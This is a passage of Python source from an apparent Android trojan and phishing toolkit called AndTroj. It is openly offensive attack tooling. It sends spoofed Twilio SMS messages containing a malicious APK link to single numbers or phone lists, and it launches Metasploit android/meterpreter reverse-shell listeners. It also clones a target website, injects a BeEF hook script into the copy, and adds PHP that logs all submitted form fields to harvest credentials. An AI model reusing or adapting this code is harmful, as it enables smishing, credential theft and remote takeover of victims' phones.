                            to='' + TARGET_NUM + ''
                        )
                        print(message.sid)
                        fg = open(atj.protcl, "r")
                        METHOD = fg.read()
                        if METHOD == "reverse_tcp":
                            subprocess.call(
                                'gnome-terminal --tab -e \'msfconsole -q -x "use multi/handler;set PAYLOAD android/meterpreter/reverse_tcp;set LHOST ' + NoIP + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + atj.tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                                shell=True)
                        elif METHOD == "reverse_http":
                            subprocess.call(
                                'gnome-terminal --tab -e \'msfconsole -q -x "use multi/handler;set PAYLOAD android/meterpreter/reverse_http;set LHOST ' + NoIP + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + atj.tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                                shell=True)
                        elif METHOD == "reverse_https":
                            subprocess.call(
                                'gnome-terminal --tab -e \'msfconsole -q -x "use multi/handler;set PAYLOAD android/meterpreter/reverse_https;set LHOST ' + NoIP + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + atj.tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                                shell=True)
                        else:
                            subprocess.call(
                                'gnome-terminal --tab -e \'msfconsole -q -x "use multi/handler;set PAYLOAD android/meterpreter/reverse_tcp;set LHOST ' + NoIP + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + atj.tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                                shell=True)
                        print "\nI: Start Ngrok status..."
                        print "I: Start Apache2 status..."
                        print "I: Start Msfconsole listing..."
                        print "I: Send SMS Spoof for {0}...".format(TARGET_NUM)
                        print "I: Content SMS Spoof: {0}...".format(MESSAGE)
                        print "\n\t[*] Join my channel > https://t.me/Unk9vvN"
                        atj.eng_menu(self="")

                    elif NGROK_SLT == "2":
                        CUSTM_URL = raw_input("\n\t[i] Example: instagram.com"
                                              "\n\t[?] CustomURL: ")
                        PHONESLT = raw_input("\n\t[1] Single: "
                                             "\n\t[2] Multiple: "
                                             "\n\nroot@unk9vvn:~# ")
                        if PHONESLT == "1":
                            SPOOF_NUM = raw_input("\n\n\t[i] Example: +12565734104\n"
                                                  "\t[?] Your Number: ")
                            TARGET_NUM = raw_input("\n\t[i] Example: +989381234567\n"
                                                   "\t[?] Target Number: ")
                            MESSAGE = raw_input("\n\t[i] Example: Would you like to hide the unk9vvn team?\n"
                                                "\t[?] Message Content: ")
                        elif PHONESLT == "2":
                            SPOOF_NUM = raw_input("\n\n\t[i] Example: +12565734104\n"
                                                  "\t[?] Your Number: ")
                            PHONELIST = raw_input("\n\t[i] Example: +989381234567\n"
                                                   "\t[?] Phonelist: ")
                            MESSAGE = raw_input("\n\t[i] Example: Would you like to hide the unk9vvn team?\n"
                                                "\t[?] Message Content: ")
                        else:
                            return PHONESLT
                        print "\n"
                        subprocess.call(
                            'proxychains ngrok update',
                            shell=True)
                        subprocess.call(
                            'gnome-terminal --tab -e \'proxychains ngrok tls -hostname=' + CUSTM_URL + ' 443\'',
                            shell=True)
                        subprocess.call(
                            'service apache2 start && cp ' + CLS_RN + '-b.apk /var/www/html/',
                            shell=True)
                        print "\nI: Please 10 sec waiting...\n"
                        time.sleep(10.0)
                        checkng = os.path.exists('/usr/share/AndTroj/tmp/rat_link.txt')
                        if checkng == (False):
                            subprocess.call(
                                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ"/' + CLS_RN + '-b.apk > /usr/share/AndTroj/tmp/rat_link.txt',
                                shell=True)
                            subprocess.call(
                                'sed -i -e \'s/\/root\///g\' /usr/share/AndTroj/tmp/rat_link.txt',
                                shell=True)
                        else:
                            subprocess.call(
                                'rm /usr/share/AndTroj/tmp/rat_link.txt',
                                shell=True)
                            subprocess.call(
                                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ"/' + CLS_RN + '-b.apk > /usr/share/AndTroj/tmp/rat_link.txt',
                                shell=True)
                            subprocess.call(
                                'sed -i -e \'s/\/root\///g\' /usr/share/AndTroj/tmp/rat_link.txt',
                                shell=True)
                        atj.Tor(self="")
                        print "\nI: Please 10 sec waiting...\n"
                        time.sleep(10.0)
                        if PHONESLT == "1":
                            TWILIO_SID = "/usr/share/AndTroj/twilio_sid.txt"
                            READ_SID = open(TWILIO_SID, "r")
                            TWIL_SID = READ_SID.read()
                            TWILIO_TOKEN = "/usr/share/AndTroj/twilio_token.txt"
                            READ_TOKEN = open(TWILIO_TOKEN, "r")
                            TWIL_TOKEN = READ_TOKEN.read()
                            RAT_LINK = "/usr/share/AndTroj/tmp/rat_link.txt"
                            READ_RAT = open(RAT_LINK, "r")
                            RAT_LNK = READ_RAT.read()
                            account_sid = '{0}'.format(TWIL_SID)
                            auth_token = '{0}'.format(TWIL_TOKEN)
                            client = Client(account_sid, auth_token)
                            message = client.messages.create(
                                from_='' + SPOOF_NUM + '',
                                body='' + MESSAGE + '\n' + RAT_LNK + '',
                                to='' + TARGET_NUM + ''
                            )
                            print(message.sid)
                        elif PHONESLT == "2":
                            f = open(PHONELIST, "r")
                            line = f.readline()
                            TWILIO_SID = "/usr/share/AndTroj/twilio_sid.txt"
                            READ_SID = open(TWILIO_SID, "r")
                            TWIL_SID = READ_SID.read()
                            TWILIO_TOKEN = "/usr/share/AndTroj/twilio_token.txt"
                            READ_TOKEN = open(TWILIO_TOKEN, "r")
                            TWIL_TOKEN = READ_TOKEN.read()
                            RAT_LINK = "/usr/share/AndTroj/tmp/rat_link.txt"
                            READ_RAT = open(RAT_LINK, "r")
                            RAT_LNK = READ_RAT.read()
                            account_sid = '{0}'.format(TWIL_SID)
                            auth_token = '{0}'.format(TWIL_TOKEN)
                            client = Client(account_sid, auth_token)
                            while line:
                                time.sleep(5.0)
                                line = f.readline()
                                message = client.messages.create(
                                    from_='' + SPOOF_NUM + '',
                                    body='' + MESSAGE + '\n' + RAT_LNK + '',
                                    to='' + line + ''
                                )
                                f.close()
                                print(message.sid)
                        else:
                            TWILIO_SID = "/usr/share/AndTroj/twilio_sid.txt"
                            READ_SID = open(TWILIO_SID, "r")
                            TWIL_SID = READ_SID.read()
                            TWILIO_TOKEN = "/usr/share/AndTroj/twilio_token.txt"
                            READ_TOKEN = open(TWILIO_TOKEN, "r")
                            TWIL_TOKEN = READ_TOKEN.read()
                            RAT_LINK = "/usr/share/AndTroj/tmp/rat_link.txt"
                            READ_RAT = open(RAT_LINK, "r")
                            RAT_LNK = READ_RAT.read()
                            account_sid = '{0}'.format(TWIL_SID)
                            auth_token = '{0}'.format(TWIL_TOKEN)
                            client = Client(account_sid, auth_token)
                            message = client.messages.create(
                                from_='' + SPOOF_NUM + '',
                                body='' + MESSAGE + '\n' + RAT_LNK + '',
                                to='' + TARGET_NUM + ''
                            )
                            print(message.sid)
                        fg = open(atj.protcl, "r")
                        METHOD = fg.read()
                        if METHOD == "reverse_tcp":
                            subprocess.call(
                                'gnome-terminal --tab -e \'msfconsole -q -x "use multi/handler;set PAYLOAD android/meterpreter/reverse_tcp;set LHOST ' + NoIP + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + atj.tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                                shell=True)
                        elif METHOD == "reverse_http":
                            subprocess.call(
                                'gnome-terminal --tab -e \'msfconsole -q -x "use multi/handler;set PAYLOAD android/meterpreter/reverse_http;set LHOST ' + NoIP + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + atj.tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                                shell=True)
                        elif METHOD == "reverse_https":
                            subprocess.call(
                                'gnome-terminal --tab -e \'msfconsole -q -x "use multi/handler;set PAYLOAD android/meterpreter/reverse_https;set LHOST ' + NoIP + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + atj.tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                                shell=True)
                        else:
                            subprocess.call(
                                'gnome-terminal --tab -e \'msfconsole -q -x "use multi/handler;set PAYLOAD android/meterpreter/reverse_tcp;set LHOST ' + NoIP + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + atj.tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                                shell=True)
                        print "\nI: Start Ngrok status..."
                        print "I: Start Apache2 status..."
                        print "I: Start Msfconsole listing..."
                        print "I: Send SMS Spoof for {0}...".format(TARGET_NUM)
                        print "I: Content SMS Spoof: {0}...".format(MESSAGE)
                        print "\n\t[*] Join my channel > https://t.me/Unk9vvN"
                        atj.eng_menu(self="")
                    else:
                        return NGROK_SLT

                elif CLONE_MTD == "2":
                    subprocess.call(
                        'chmod o+w /var/www/html/',
                        shell=True)
                    subprocess.call(
                        'sed -i \'137s/.*/        enable: true/\' /usr/share/beef-xss/config.yaml && '
                        'sed -i \'156s/.*/            enable: true/\' /usr/share/beef-xss/config.yaml',
                        shell=True)
                    subprocess.call(
                        'sed -i \'18s/.*/            host: "' + LAN + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml && '
                        'sed -i \'28s/.*/            callback_host: "' + LAN + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml',
                        shell=True)
                    NGROK_SLT = raw_input("\n\t[1] Ngrok FreeURL(Free)"
                                          "\n\t[2] Ngrok CustomURL(Business)"
                                          "\n\nroot@unk9vvn:~# ")
                    print "\n"
                    if NGROK_SLT == "1":
                        NoIP = raw_input("\n\t[i] Use IP Public or DNS NoIP."
                                         "\n\t[?] NoIP: ")
                        print "\n"
                        SPOOF_NUM = raw_input("\n\n\t[i] Example: +12565734104\n"
                                              "\t[?] Your Number: ")
                        TARGET_NUM = raw_input("\n\t[i] Example: +989381234567\n"
                                               "\t[?] Target Number: ")
                        MESSAGE = raw_input("\n\t[i] Example: Would you like to hide the unk9vvn team?\n"
                                            "\t[?] Message Content: ")
                        print "\n"
                        subprocess.call(
                            'noip2 && proxychains ngrok update',
                            shell=True)
                        subprocess.call(
                            'gnome-terminal --tab -e \'proxychains ngrok http 80\'',
                            shell=True)
                        pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
                        for pid in pids:
                            try:
                                cmd = open(os.path.join('/proc', pid, 'cmdline'), 'rb').read()
                                if cmd.find('ruby') != -1:
                                    print "Kill PID: %s; Command: %s" % (pid, cmd)
                                    subprocess.call(
                                        'ps -ef | grep ruby | grep -v grep | awk \'{print $2}\' | xargs kill',
                                        shell=True)
                            except IOError:
                                continue
                        subprocess.call(
                            'sed -i \'45s/.*/        dns_host: "' + NoIP + '"/\' /usr/share/beef-xss/config.yaml && '
                            'sed -i \'103s/.*/        db_host: "' + NoIP + '"/\' /usr/share/beef-xss/config.yaml',
                            shell=True)
                        chek_index = os.path.exists('/var/www/html/index.html')
                        if chek_index == (True):
                            subprocess.call(
                                'rm /var/www/html/index.html',
                                shell=True)
                        else:
                            pass
                        subprocess.call(
                            'service apache2 start && cd /var/www/html/ && wget --no-check-certificate -O index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "' + URL_CLONE + '"',
                            shell=True)
                        subprocess.call(
                            'sed -i \'s#</body>#\\n<script src="http://' + NoIP + ':3000/hook.js"></script></body>#g\' /var/www/html/index.html',
                            shell=True)
                        subprocess.call(
                            'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + atj.bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'<%= @hook_uri %>' + atj.bslash1 + '" type=' + atj.bslash1 + '"text/javascript' + atj.bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
                            shell=True)
                        subprocess.call(
                            'sed -i -e \'s/\/root\///g\' /var/www/html/index.html',
                            shell=True)
                        subprocess.call(
                            'sed -i -e \'s#iIIi#\\\#g\' /var/www/html/index.html',
                            shell=True)
                        subprocess.call(
                            'mv /var/www/html/index.html /var/www/html/index.php',
                            shell=True)
                        subprocess.call(
                            "sed -i \"1s#.*#<?php\\nif (\$_SERVER['REQUEST_METHOD'] == 'POST') {\\nheader('Location: " + URL_CLONE + "');\\n\$handle = fopen('log.txt', 'a');\\nfwrite(\$handle, '---['.\$_SERVER['SERVER_NAME'].\$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date(" + atj.slashkutat + "h:i:s a - Y/m/d" + atj.slashkutat + ")).']---['.\$_SERVER['REMOTE_ADDR']." + atj.slashkutat + "]" + atj.bslash1 + "\\\\\\r\\\\\\n" + atj.slashkutat + ");\\nforeach(\$_POST as \$variable => \$value) {\\nfwrite(\$handle, \$variable.': '.\$value." + atj.slashkutat + "\\\\\\r\\\\\\n" + atj.slashkutat + ");}\\nfclose(\$handle);\\nexit;\\n} ?>#\" /var/www/html/index.php",
                            shell=True)
                        subprocess.call(
                            'sed -i \'s#action="[^"]*"#action="<?php echo basename(__FILE__); ?>"#g\' /var/www/html/index.php',
                            shell=True)
                        subprocess.call(
                            'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123"\'',
                            shell=True)
                        checklog = os.path.exists('/var/www/html/log.txt')
                        if checklog == (False):
                            subprocess.call(
                                'touch /var/www/html/log.txt && chown -R www-data /var/www/html/log.txt  && chgrp -R www-data /var/www/html/log.txt',
                                shell=True)
                            subprocess.call(
                                'gnome-terminal --tab -e \'tail -f /var/www/html/log.txt\'',
                                shell=True)
                        else:
                            subprocess.call(
                                'rm /var/www/html/log.txt',
                                shell=True)
                            subprocess.call(
                                'touch /var/www/html/log.txt && chown -R www-data /var/www/html/log.txt  && chgrp -R www-data /var/www/html/log.txt',
                                shell=True)
                            subprocess.call(
                                'gnome-terminal --tab -e \'tail -f /var/www/html/log.txt\'',
                                shell=True)
                        print "\nI: Please 30 sec waiting...\n"
                        time.sleep(15.0)
                        subprocess.call(
                            'cd /usr/share/beef-xss/ && gnome-terminal --tab -e \'./beef\'',
                            shell=True)
                        time.sleep(5.0)
                        checkng = os.path.exists('/usr/share/AndTroj/tmp/ngrok_url.txt')
                        if checkng == (False):
                            subprocess.call(
                                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ" > /usr/share/AndTroj/tmp/ngrok_url.txt',
                                shell=True)
                        else:
                            subprocess.call(
                                'rm /usr/share/AndTroj/tmp/ngrok_url.txt',
                                shell=True)
                            subprocess.call(
                                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ" > /usr/share/AndTroj/tmp/ngrok_url.txt',
                                shell=True)
                        fp = open(atj.ng_url, "r")
                        URL = fp.read()
                        time.sleep(5.0)
                        subprocess.call(
                            'gnome-terminal --tab -e \'firefox -url ' + URL + ' -new-tab -url http://' + LAN + ':3000/ui/panel\'',
                            shell=True)
                        atj.Tor(self="")
                        print "\nI: Please 10 sec waiting...\n"
                        time.sleep(10.0)
                        TWILIO_SID = "/usr/share/AndTroj/twilio_sid.txt"
                        READ_SID = open(TWILIO_SID, "r")
                        TWIL_SID = READ_SID.read()
                        TWILIO_TOKEN = "/usr/share/AndTroj/twilio_token.txt"
                        READ_TOKEN = open(TWILIO_TOKEN, "r")
                        TWIL_TOKEN = READ_TOKEN.read()
                        account_sid = '{0}'.format(TWIL_SID)
                        auth_token = '{0}'.format(TWIL_TOKEN)
                        client = Client(account_sid, auth_token)
                        message = client.messages.create(
                            from_='' + SPOOF_NUM + '',
                            body='' + MESSAGE + '\n' + URL + '',
                            to='' + TARGET_NUM + ''
                        )
                        print(message.sid)
                        print "\nI: Start Ngrok status..."
                        print "I: Start Apache2 status..."
                        print "I: Start Msfconsole listing..."
                        print "I: Send SMS Spoof for {0}...".format(TARGET_NUM)
                        print "I: Content SMS Spoof: {0}...".format(MESSAGE)
                        print "\n\t[*] Join my channel > https://t.me/Unk9vvN"
                        atj.eng_menu(self="")

                    elif NGROK_SLT == "2":
                        CUSTM_URL = raw_input("\n\t[i] Example: instagram.com"
                                              "\n\t[?] CustomURL: ")
                        PHONESLT = raw_input("\n\t[1] Single: "
                                             "\n\t[2] Multiple: "
                                             "\n\nroot@unk9vvn:~# ")
                        if PHONESLT == "1":
                            SPOOF_NUM = raw_input("\n\n\t[i] Example: +12565734104\n"
                                                  "\t[?] Your Number: ")
                            TARGET_NUM = raw_input("\n\t[i] Example: +989381234567\n"
                                                   "\t[?] Target Number: ")
                            MESSAGE = raw_input("\n\t[i] Example: Would you like to hide the unk9vvn team?\n"
                                                "\t[?] Message Content: ")
                        elif PHONESLT == "2":
                            SPOOF_NUM = raw_input("\n\n\t[i] Example: +12565734104\n"
                                                  "\t[?] Your Number: ")
                            PHONELIST = raw_input("\n\t[i] Example: +989381234567\n"
                                                  "\t[?] Phonelist: ")
                            MESSAGE = raw_input("\n\t[i] Example: Would you like to hide the unk9vvn team?\n"
                                                "\t[?] Message Content: ")
                        else:
                            return PHONESLT
                        print "\n"
                        subprocess.call(
                            'proxychains ngrok update',
                            shell=True)
                        subprocess.call(
                            'gnome-terminal --tab -e \'proxychains ngrok tls -hostname=' + CUSTM_URL + ' 443\'',
                            shell=True)
                        subprocess.call(
                            'gnome-terminal --tab -e \'proxychains ngrok tcp 3000\'',
                            shell=True)
                        chek_nngk = os.path.exists('/usr/share/AndTroj/tmp/ngrok_beef.txt')
                        if chek_nngk == (False):
                            pass
                        else:
                            subprocess.call(
                                'rm /usr/share/AndTroj/tmp/ngrok_beef.txt',
                                shell=True)
                        time.sleep(7.0)
                        subprocess.call(
                            'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"tcp:\/\/0.tcp.ngrok.io:([^"]*).*/\\1/p\') && echo "$FUZ" >> /usr/share/AndTroj/tmp/ngrok_beef.txt',
                            shell=True)
                        fs = open(atj.out9)
                        length = 5
                        LGPORT_BEEF = fs.read(length)
                        pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
                        for pid in pids:
                            try:
                                cmd = open(os.path.join('/proc', pid, 'cmdline'), 'rb').read()
                                if cmd.find('ruby') != -1:
                                    print "Kill PID: %s; Command: %s" % (pid, cmd)
                                    subprocess.call(
                                        'ps -ef | grep ruby | grep -v grep | awk \'{print $2}\' | xargs kill',
                                        shell=True)
                            except IOError:
                                continue
                        chek_ngk = os.path.exists('/usr/share/AndTroj/tmp/ngrok.txt')
                        if chek_ngk == (True):
                            subprocess.call(
                                'sed -i \'45s/.*/        dns_host: "' + LHOST + '"/\' /usr/share/beef-xss/config.yaml && '
                                'sed -i \'103s/.*/        db_host: "' + LHOST + '"/\' /usr/share/beef-xss/config.yaml',
                                shell=True)
                        else:
                            subprocess.call(
                                'sed -i \'45s/.*/        dns_host: "' + NGHOST + '"/\' /usr/share/beef-xss/config.yaml && '
                                'sed -i \'103s/.*/        db_host: "' + NGHOST + '"/\' /usr/share/beef-xss/config.yaml',
                                shell=True)
                        chek_index = os.path.exists('/var/www/html/index.html')
                        if chek_index == (True):
                            subprocess.call(
                                'rm /var/www/html/index.html',
                                shell=True)
                        else:
                            pass
                        subprocess.call(
                            'service apache2 start && cd /var/www/html/ && wget --no-check-certificate -O index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "' + URL_CLONE + '"',
                            shell=True)
                        subprocess.call(
                            'sed -i \'s#</body>#\\n<script src="http://' + LGHOST + ':' + LGPORT_BEEF + '/hook.js"></script></body>#g\' /var/www/html/index.html',
                            shell=True)
                        subprocess.call(
                            'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + atj.bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'<%= @hook_uri %>' + atj.bslash1 + '" type=' + atj.bslash1 + '"text/javascript' + atj.bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
                            shell=True)
                        subprocess.call(
                            'sed -i -e \'s/\/root\///g\' /var/www/html/index.html',
                            shell=True)
                        subprocess.call(
                            'sed -i -e \'s#iIIi#\\\#g\' /var/www/html/index.html',
                            shell=True)
                        subprocess.call(
                            'mv /var/www/html/index.html /var/www/html/index.php',
                            shell=True)
                        subprocess.call(
                            "sed -i \"1s#.*#<?php\\nif (\$_SERVER['REQUEST_METHOD'] == 'POST') {\\nheader('Location: " + URL_CLONE + "');\\n\$handle = fopen('log.txt', 'a');\\nfwrite(\$handle, '---['.\$_SERVER['SERVER_NAME'].\$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date(" + atj.slashkutat + "h:i:s a - Y/m/d" + atj.slashkutat + ")).']---['.\$_SERVER['REMOTE_ADDR']." + atj.slashkutat + "]" + atj.bslash1 + "\\\\\\r\\\\\\n" + atj.slashkutat + ");\\nforeach(\$_POST as \$variable => \$value) {\\nfwrite(\$handle, \$variable.': '.\$value." + atj.slashkutat + "\\\\\\r\\\\\\n" + atj.slashkutat + ");}\\nfclose(\$handle);\\nexit;\\n} ?>#\" /var/www/html/index.php",
                            shell=True)
                        subprocess.call(
                            'sed -i \'s#action="[^"]*"#action="<?php echo basename(__FILE__); ?>"#g\' /var/www/html/index.php',
                            shell=True)
                        subprocess.call(
                            'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123"\'',
                            shell=True)
                        checklog = os.path.exists('/var/www/html/log.txt')
                        if checklog == (False):
                            subprocess.call(
                                'touch /var/www/html/log.txt && chown -R www-data /var/www/html/log.txt  && chgrp -R www-data /var/www/html/log.txt',
                                shell=True)
                            subprocess.call(
                                'gnome-terminal --tab -e \'tail -f /var/www/html/log.txt\'',
                                shell=True)
                        else:
                            subprocess.call(
                                'rm /var/www/html/log.txt',
                                shell=True)
                            subprocess.call(
                                'touch /var/www/html/log.txt && chown -R www-data /var/www/html/log.txt  && chgrp -R www-data /var/www/html/log.txt',
                                shell=True)
                            subprocess.call(
                                'gnome-terminal --tab -e \'tail -f /var/www/html/log.txt\'',
                                shell=True)
                        print "\nI: Please 30 sec waiting...\n"
                        time.sleep(15.0)
                        subprocess.call(
                            'cd /usr/share/beef-xss/ && gnome-terminal --tab -e \'./beef\'',
                            shell=True)
                        time.sleep(5.0)
                        checkng = os.path.exists('/usr/share/AndTroj/tmp/ngrok_url.txt')
                        if checkng == (False):
                            subprocess.call(
                                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ" > /usr/share/AndTroj/tmp/ngrok_url.txt',
                                shell=True)
                        else:
                            subprocess.call(
                                'rm /usr/share/AndTroj/tmp/ngrok_url.txt',
                                shell=True)
                            subprocess.call(
                                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ" > /usr/share/AndTroj/tmp/ngrok_url.txt',
                                shell=True)
                        fp = open(atj.ng_url, "r")
                        URL = fp.read()
                        time.sleep(5.0)
                        subprocess.call(
                            'gnome-terminal --tab -e \'firefox -url ' + URL + ' -new-tab -url http://' + LAN + ':3000/ui/panel\'',
                            shell=True)
                        atj.Tor(self="")
                        print "\nI: Please 10 sec waiting...\n"
                        time.sleep(10.0)
                        if PHONESLT == "1":
                            TWILIO_SID = "/usr/share/AndTroj/twilio_sid.txt"
                            READ_SID = open(TWILIO_SID, "r")
                            TWIL_SID = READ_SID.read()
                            TWILIO_TOKEN = "/usr/share/AndTroj/twilio_token.txt"
                            READ_TOKEN = open(TWILIO_TOKEN, "r")
                            TWIL_TOKEN = READ_TOKEN.read()
                            RAT_LINK = "/usr/share/AndTroj/tmp/rat_link.txt"
                            READ_RAT = open(RAT_LINK, "r")
                            RAT_LNK = READ_RAT.read()
                            account_sid = '{0}'.format(TWIL_SID)
                            auth_token = '{0}'.format(TWIL_TOKEN)
                            client = Client(account_sid, auth_token)
                            message = client.messages.create(
                                from_='' + SPOOF_NUM + '',
                                body='' + MESSAGE + '\n' + RAT_LNK + '',
                                to='' + TARGET_NUM + ''
                            )
                            print(message.sid)
                        elif PHONESLT == "2":
                            f = open(PHONELIST, "r")
                            line = f.readline()
                            TWILIO_SID = "/usr/share/AndTroj/twilio_sid.txt"
                            READ_SID = open(TWILIO_SID, "r")
                            TWIL_SID = READ_SID.read()
                            TWILIO_TOKEN = "/usr/share/AndTroj/twilio_token.txt"
                            READ_TOKEN = open(TWILIO_TOKEN, "r")
                            TWIL_TOKEN = READ_TOKEN.read()
                            RAT_LINK = "/usr/share/AndTroj/tmp/rat_link.txt"
                            READ_RAT = open(RAT_LINK, "r")
                            RAT_LNK = READ_RAT.read()
                            account_sid = '{0}'.format(TWIL_SID)
                            auth_token = '{0}'.format(TWIL_TOKEN)
                            client = Client(account_sid, auth_token)
                            while line:
                                time.sleep(5.0)
                                line = f.readline()
                                message = client.messages.create(
                                    from_='' + SPOOF_NUM + '',
                                    body='' + MESSAGE + '\n' + RAT_LNK + '',
                                    to='' + line + ''
                                )
                                f.close()
                                print(message.sid)
                        else:
                            TWILIO_SID = "/usr/share/AndTroj/twilio_sid.txt"
                            READ_SID = open(TWILIO_SID, "r")
                            TWIL_SID = READ_SID.read()
                            TWILIO_TOKEN = "/usr/share/AndTroj/twilio_token.txt"
                            READ_TOKEN = open(TWILIO_TOKEN, "r")
                            TWIL_TOKEN = READ_TOKEN.read()
                            RAT_LINK = "/usr/share/AndTroj/tmp/rat_link.txt"
                            READ_RAT = open(RAT_LINK, "r")
                            RAT_LNK = READ_RAT.read()
                            account_sid = '{0}'.format(TWIL_SID)
                            auth_token = '{0}'.format(TWIL_TOKEN)
                            client = Client(account_sid, auth_token)
                            message = client.messages.create(
                                from_='' + SPOOF_NUM + '',
                                body='' + MESSAGE + '\n' + RAT_LNK + '',
                                to='' + TARGET_NUM + ''
                            )
                            print(message.sid)
                        print "\nI: Start Ngrok status..."
                        print "I: Start Apache2 status..."
                        print "I: Start Msfconsole listing..."
                        print "I: Send SMS Spoof for {0}...".format(TARGET_NUM)
                        print "I: Content SMS Spoof: {0}...".format(MESSAGE)
                        print "\n\t[*] Join my channel > https://t.me/Unk9vvN"
                        atj.eng_menu(self="")
                    else:
                        return NGROK_SLT
                else:
                    atj.eng_menu(self="")
            else:
                print "\n\t[X] Please selected 4 item for install Ngrok BeEF and Twilio..."
                atj.eng_menu(self="")

        elif eng == "3":
            chekngk = os.path.exists('/root/.ngrok2/ngrok.yml')
            if chekngk == (True):
                print "\n"
            else:
                print "\n\t[X] Please selected 4 item for install Ngrok BeEF and Twilio..."
                atj.eng_menu(self="")

        elif eng == "4":
            chekngk = os.path.exists('/root/.ngrok2/ngrok.yml')
            if chekngk == (True):
                print "\n"
                total = int(input("A few Ports: "))

                for i in range(total):
                    print "\n"
                    m = raw_input("\tProtocol(tcp/http): ")
                    n = raw_input("\tNumber NPORT: ")
                    print "\n"
                    subprocess.call(
                        'gnome-terminal --tab -e \'proxychains ngrok ' + m + ' ' + n + '\'',
                        shell=True)
            else:
                print "\n\t[X] Please selected 4 item for install Ngrok BeEF and Twilio..."
                atj.eng_menu(self="")

        elif eng == "5":
            atj.main_menu(self="")

        elif eng == "0":
            sys.exit()
        else:
            atj.eng_menu(self="")

AVI = atj()
atj.main_menu(self="")
